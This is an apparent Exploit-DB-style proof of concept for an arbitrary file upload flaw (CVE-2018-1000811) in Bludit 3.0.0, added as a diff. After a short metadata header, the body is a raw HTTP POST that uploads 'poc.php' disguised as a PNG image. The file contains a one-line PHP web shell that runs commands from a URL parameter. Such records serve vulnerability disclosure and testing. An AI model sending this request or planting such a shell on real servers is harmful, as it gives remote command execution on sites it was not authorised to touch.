@@ -1,0 +1,34 @@
+# Exploit Title: bludit Pages Editor 3.0.0 - Arbitrary File Upload 
+# Date: 2018-10-02
+# Google Dork: N/A
+# Exploit Author: BouSalman
+# Vendor Homepage: https://www.bludit.com/
+# Software Link: N/A
+# Version: 3.0.0
+# Tested on: Ubuntu 18.04
+# CVE : 2018-1000811
+
+POST /admin/ajax/upload-files HTTP/1.1
+Host: 192.168.140.154
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.140.154/admin/new-content
+X-Requested-With: XMLHttpRequest
+Content-Length: 415
+Content-Type: multipart/form-data; boundary=---------------------------26228568510541774541866388118
+Cookie: BLUDIT-KEY=5s634f6up72tmfi050i4okunf9
+Connection: close
+
+-----------------------------26228568510541774541866388118
+Content-Disposition: form-data; name="tokenCSRF"
+
+67987ea926223b28949695d6936191d28d320f20
+-----------------------------26228568510541774541866388118
+Content-Disposition: form-data; name="bluditInputFiles[]"; filename="poc.php"
+Content-Type: image/png
+
+<?php system($_GET["cmd"]);?>
+
+-----------------------------26228568510541774541866388118--
